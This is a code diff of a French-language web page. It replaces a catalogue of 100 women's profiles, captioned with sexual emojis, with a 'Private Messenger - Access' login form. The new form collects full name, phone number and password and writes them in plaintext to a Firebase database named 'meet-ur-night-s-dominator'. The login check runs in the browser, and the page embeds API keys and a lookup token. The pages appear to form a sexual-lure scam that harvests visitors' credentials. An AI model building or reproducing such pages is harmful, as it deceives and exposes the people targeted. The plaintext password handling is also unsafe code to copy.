@@ -1,208 +1,140 @@
-   <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>loading's profiles</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Private Messenger - Access</title>
 
-<style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:"Segoe UI", Arial, sans-serif;
-}
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 
-body{
-  min-height:100vh;
-background:linear-gradient(135deg,brown,tan,blue,white,Orange,purple,black,yellow,pink,green,white,red,gray,purple,black,blue,tan,brown,yellow,red,gray,black,green,purple,blue,white,red,tan,pink,brown,yellow,gray,black,blue,purple,red,green,yellow,tan,white,brown,black,orange,pink,blue);
-
-  background-size: 400% 400%;
-  animation: gradientBG 15s ease infinite;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  color:white;
-}
-
-@keyframes gradientBG {
-  0% { background-position: 0% 50%; }
-  50% { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
-
-.container{
-  width:95%;
-  max-width:900px;
-  background:rgba(255,255,255,0.1);
-  backdrop-filter:blur(15px);
-  -webkit-backdrop-filter:blur(15px);
-  border-radius:25px;
-  padding:30px;
-  box-shadow:0 25px 50px rgba(0,0,0,0.5);
-  animation:fadeIn 0.6s ease;
-  margin: 20px 0;
-}
-
-@keyframes fadeIn{
-  from{opacity:0; transform:translateY(20px);}
-  to{opacity:1; transform:translateY(0);}
-}
-
-.container h1{
-  text-align:center;
-  margin-bottom:10px;
-  font-size:32px;
-  letter-spacing: 2px;
-}
-
-.container p{
-  text-align:center;
-  font-size:15px;
-  opacity:0.9;
-  margin-bottom:25px;
-}
-
-.profiles{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(110px,1fr));
-  gap:20px;
-}
-
-.profile{
-  background:rgba(255,255,255,0.15);
-  border-radius:20px;
-  padding:12px;
-  text-align:center;
-  cursor:pointer;
-  transition: all 0.3s ease;
-  border: 1px solid rgba(255,255,255,0.1);
-}
-
-.profile:hover{
-  transform:translateY(-8px);
-  background:rgba(255,255,255,0.25);
-  box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-}
-
-.profile img{
-  width:100%;
-  height:120px;
-  border-radius:15px;
-  object-fit:cover;
-  margin-bottom:8px;
-  border:2px solid rgba(255,255,255,0.3);
-  background: #333;
-}
-
-.profile span{
-  font-size:14px;
-  font-weight:600;
-  display: block;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  white-space: nowrap;
-}
-
-.footer{
-  text-align:center;
-  margin-top:25px;
-  font-size:13px;
-  opacity:0.7;
-}
-
-#loadMore:active {
-  transform: scale(0.95);
-}
-</style>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:"Segoe UI", Arial, sans-serif; }
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at center, #2c3e50, #000000);
+      padding: 20px;
+    }
+    .start-container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(15px);
+      width: 100%;
+      max-width: 420px;
+      padding: 40px 30px;
+      border-radius: 25px;
+      box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    h2 { color: #fff; margin-bottom: 10px; font-size: 28px; letter-spacing: 1px; }
+    p { color: #aaa; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
+    input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      border: 1px solid #333;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+    }
+    .iti { width: 100%; margin-bottom: 20px; }
+    .iti__country-list { background-color: #1a1a1a; color: #fff; text-align: left; border: 1px solid #333; border-radius: 10px; }
+    button {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(to right, #00d2ff, #3a7bd5);
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.4s;
+    }
+    button:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(58, 123, 213, 0.4); }
+  </style>
 </head>
-
 <body>
 
-<div class="container">
-  <h1>D!$C¤V€R C@TAL¤GU€</h1>
-  <p>Select 1 profil 2 discover her prestation🫦👅</p>
-
-  <div class="profiles" id="profiles"></div>
-
-  <div style="text-align:center;margin-top:25px;">
-    <button id="loadMore" style="padding:12px 40px;border:none;border-radius:25px;background:#25d366;color:black;font-weight: bold;font-size:16px;cursor:pointer;transition: 0.3s;box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);">
-      SEE ➕️ MORE
-    </button>
-  </div>
-  
-  <div class="footer">
-    secured Interface ~ private msg
-  </div>
+<div class="start-container">
+  <h2>WELCOME</h2>
+  <p>Identify yourself to access your secure private messages.</p>
+  <form id="accessForm">
+    <input type="text" id="userName" placeholder="Full Name" required>
+    <input type="tel" id="userPhone" required>
+    <input type="password" id="userPass" placeholder="Password" required>
+    <button type="submit" id="btnGo">ENTER SYSTEM</button>
+  </form>
 </div>
 
 <script>
-const profils = {
-  1:"Alessia",2:"Alice",3:"Angela",4:"Arianna",5:"Aurora",
-  6:"Beatrice",7:"Benedetta",8:"Bianca",9:"Camilla",10:"Carla",
-  11:"Carlotta",12:"Caterina",13:"Chiara",14:"Claudia",15:"Cristina",
-  16:"Daniela",17:"Deborah",18:"Denise",19:"Diana",20:"Elena",
-  21:"Eleonora",22:"Elisa",23:"Elisabetta",24:"Emma",25:"Federica",
-  26:"Francesca",27:"Gabriella",28:"Gaia",29:"Giada",30:"Giulia",
-  31:"Giorgia",32:"Ilaria",33:"Isabella",34:"Laura",35:"Lavinia",
-  36:"Lea",37:"Letizia",38:"Lidia",39:"Lorenza",40:"Lucia",
-  41:"Lucrezia",42:"Ludovica",43:"Manuela",44:"Mara",45:"Margherita",
-  46:"Maria",47:"Marianna",48:"Martina",49:"Matilde",50:"Michela",
-  51:"Miriam",52:"Monica",53:"Nadia",54:"Nicole",55:"Nicoletta",
-  56:"Noemi",57:"Paola",58:"Patrizia",59:"Rebecca",60:"Roberta",
-  61:"Rosa",62:"Rosalia",63:"Sabrina",64:"Samantha",65:"Sara",
-  66:"Serena",67:"Silvia",68:"Simona",69:"Sofia",70:"Sonia",
-  71:"Stefania",72:"Stella",73:"Susanna",74:"Teresa",75:"Valentina",
-  76:"Valeria",77:"Vanessa",78:"Veronica",79:"Viola",80:"Virginia",
-  81:"Viviana",82:"Agata",83:"Anita",84:"Antonella",85:"Asia",
-  86:"Bruna",87:"Carmen",88:"Carina",89:"Cinzia",90:"Costanza",
-  91:"Dafne",92:"Emanuela",93:"Fiorella",94:"Gabriela",95:"Gemma",
-  96:"Iolanda",97:"Lara",98:"Melissa",99:"Rosanna",100:"Stefania"
+const firebaseConfig = {
+  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
+  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
+  projectId: "meet-ur-night-s-dominator",
+  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
+  messagingSenderId: "1021669198456",
+  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
+  measurementId: "G-SFPWNFM8PY",
+  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
 };
 
-const container = document.getElementById("profiles");
-const loadMoreBtn = document.getElementById("loadMore");
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-const ids = Object.keys(profils);
-let index = 0;
-const STEP = 20;
-
-function loadProfiles() {
-  const fragment = document.createDocumentFragment(); 
-  
-  for(let i=0; i<STEP && index<ids.length; i++, index++){
-    const id = ids[index];
-    const div = document.createElement("div");
-    div.className="profile";
-    div.innerHTML = `
-      <img src="IMAGE/img${id}.jpg" alt="${profils[id]}" onerror="this.src='https://via.placeholder.com/150?text=No+Image'">
-      <span>${profils[id]}</span>
-    `;
-    
-    // LOGIQUE //
-    div.onclick = () => {
-      //  Sauvegarde les infos du profil choisi  //
-      localStorage.setItem('selectedProfile', profils[id]); 
-      localStorage.setItem('selectedImgId', id); 
-      
-      // Redirection vers page1.html //
-      window.location.href = `page1.html`;
-    };
-    
-    fragment.appendChild(div);
-  }
-
-  container.appendChild(fragment);
-
-  if(index >= ids.length) {
-    loadMoreBtn.style.display="none";
-  }
+// --- VÉRIFICATION SESSION ACTIVE ---
+if (localStorage.getItem("currentUserName") && localStorage.getItem("currentUserPhone")) {
+    window.location.href = "index.html";
 }
 
-loadProfiles();
-loadMoreBtn.onclick = loadProfiles;
-</script>
+const inputPhone = document.querySelector("#userPhone");
+const iti = window.intlTelInput(inputPhone, {
+  initialCountry: "auto",
+  geoIpLookup: callback => {
+    fetch('https://ipinfo.io/json?token=7ed49f6979603a')
+      .then(res => res.json()).then(data => callback(data.country))
+      .catch(() => callback("fr"));
+  },
+  utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+  separateDialCode: true,
+  preferredCountries: ["fr", "bj", "ci", "be", "ca", "us"]
+});
 
+document.getElementById("accessForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+  const phone = iti.getNumber();
+  const name = document.getElementById("userName").value.trim();
+  const pass = document.getElementById("userPass").value.trim();
+  
+  if (!iti.isValidNumber()) { alert("Numéro invalide"); return; }
+
+  const btn = document.getElementById("btnGo");
+  btn.disabled = true;
+  const userKey = phone.replace(/\+/g, '');
+
+  db.ref("registered_users/" + userKey).once("value").then(snap => {
+    const data = snap.val();
+    if (data && data.password !== pass) {
+      alert("Mot de passe incorrect");
+      btn.disabled = false;
+    } else {
+      if (!data) {
+        db.ref("registered_users/" + userKey).set({ nom: name, phone: phone, password: pass });
+      }
+      localStorage.setItem("currentUserName", name);
+      localStorage.setItem("currentUserPhone", phone);
+      window.location.href = "home.html";
+    }
+  });
+});
+</script>
 </body>
 </html>
